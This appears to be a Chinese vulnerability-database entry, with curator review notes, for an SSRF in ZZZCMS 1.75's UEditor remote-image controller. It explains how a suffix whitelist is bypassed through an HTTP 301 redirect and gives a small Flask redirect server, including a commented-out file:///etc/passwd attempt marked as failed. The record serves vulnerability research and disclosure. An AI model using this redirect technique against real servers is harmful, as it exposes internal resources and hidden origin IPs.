---
source: "hatch 补库批 20260928"
product: "ZZZCMS1.75"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Zzzcms 1.75 ssrf"
prerequisites: "来源所述条件，未列明部分仍待核：UEditorcontrollerreachable/authunknown;extensionallowlist; HTTPredirectandoutboundfetch"
side_effects: "未执行；本文需注意的操作影响：Python路由1.txt与图片后缀白名单关系未解释，完整上传/抓图action参数只图"
source_status: "unknown"
id: "vw-f52f0684aa3776a43ad5822f"
entity_id: "ve-f52f0684aa3776a43ad5822f"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：UEditorcontrollerreachable/authunknown;extensionallowlist; HTTPredirectandoutboundfetch

- **结论使用边界（1）**：作者明确file://重定向not work，不能把本文标已证任意本地读；保留失败结果。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：简介称本地支持file但已示redirect失败，两者需区分直接协议/重定向策略。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：Python路由1.txt与图片后缀白名单关系未解释，完整上传/抓图action参数只图。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（4）**：获取真实IP仅说明出站出口，不必是源站服务IP；无修复但xz来源精准。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Zzzcms 1.75 ssrf

一、漏洞简介
------------

存在这个问题的接口主要功能是远程下载保存图片，但是后缀限制死了，因此远程下载webshell的目的应该是达不到了，退而求其次也可以作为SSRF利用，比如需要获取目标主机的真实IP地址的场景下。

二、漏洞影响
------------

Zzzcms 1.75

三、复现过程
------------

### 漏洞分析

功能实现在

    plugins/ueditor/php/controller.php

![](./.resource/Zzzcms1.75ssrf/media/rId25.png)

传入的post参数进入safe\_url函数进行处理，然后传入down\_url函数。这里safe\_url函数作用不大，主要是在down\_url中的逻辑。

在down\_url函数逻辑中根据url获取了保存的文件名和后缀，并且进行了文件名后缀的白名单限制和检测。

![](./.resource/Zzzcms1.75ssrf/media/rId26.png)

最后通过readfile进行远程资源获取（本地也可以，支持file协议），这里通过file\_ext函数传入`http://XXXX/x.php?x.jpg`得到的文件名后缀仍然是php，对问号进行了处理，因此利用SSRF达到任意地址访问需要利用301/302跳转实现，本地搭建一个提供跳转的http服务器，然后进行访问：

    from flask import Flask,redirect,request
    app = Flask(__name__)
    @app.route('/1.txt')
    def index(page_name=''):
        #return redirect('file:///etc/passwd', code=301) #not work
        return redirect('http://www.net.cn/static/customercare/yourip.asp', code=301)
    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=9000, debug=app.debug)

![](./.resource/Zzzcms1.75ssrf/media/rId27.png)

![](./.resource/Zzzcms1.75ssrf/media/rId28.png)

参考链接
--------

> https://xz.aliyun.com/t/7414
